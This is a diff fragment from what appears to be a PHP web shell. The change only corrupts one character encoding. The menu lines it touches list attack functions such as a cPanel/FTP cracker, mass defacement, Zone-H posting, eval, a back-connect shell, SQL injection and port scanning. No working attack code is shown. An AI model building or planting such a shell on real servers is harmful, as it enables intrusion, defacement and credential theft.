@@ -1192,7 +1192,7 @@ function sl()
 <option>Select</option>
 <option value=\"cmdr\">Commander</option>
 <option value=\"frc\">File Explorer</option>
-<option value=\"seaa\">Search</option><option value=\"ftm\">Cpanel + FTP Cracker</option><option value=\"fts\">Mass Index</option><option value=\"cry\">Crypt</option><option value=\"fbk\">Eval PHP</option><option value=\"fcf\">Htaccess Option</option><option value=\"mil\">Mailer</option><option value=\"fsf\">Zone-H</option></select><input type=\"submit\" name=\"allss\" value=\"GO\" /><select size=\"1\" name=\"dbOP\" title=\"DBaseS Action\" ><option>Select</option><option value=\"dau\">phpMyAdmin</option><option value=\"dmi\">vBulletin®</option><option value=\"ddu\">Back Connect</option><option value=\"ddr\">Users</option><option value=\"dml\">SQL Injction</option><option value=\"dqu\">Port Scan</option>
+<option value=\"seaa\">Search</option><option value=\"ftm\">Cpanel + FTP Cracker</option><option value=\"fts\">Mass Index</option><option value=\"cry\">Crypt</option><option value=\"fbk\">Eval PHP</option><option value=\"fcf\">Htaccess Option</option><option value=\"mil\">Mailer</option><option value=\"fsf\">Zone-H</option></select><input type=\"submit\" name=\"allss\" value=\"GO\" /><select size=\"1\" name=\"dbOP\" title=\"DBaseS Action\" ><option>Select</option><option value=\"dau\">phpMyAdmin</option><option value=\"dmi\">vBulletinï¿½</option><option value=\"ddu\">Back Connect</option><option value=\"ddr\">Users</option><option value=\"dml\">SQL Injction</option><option value=\"dqu\">Port Scan</option>
 <option value=\"etr\">Extract Remote Site</option></select>
 
 <input type=\"submit\" name=\"allqw\" value=\"GO\" /></form>";
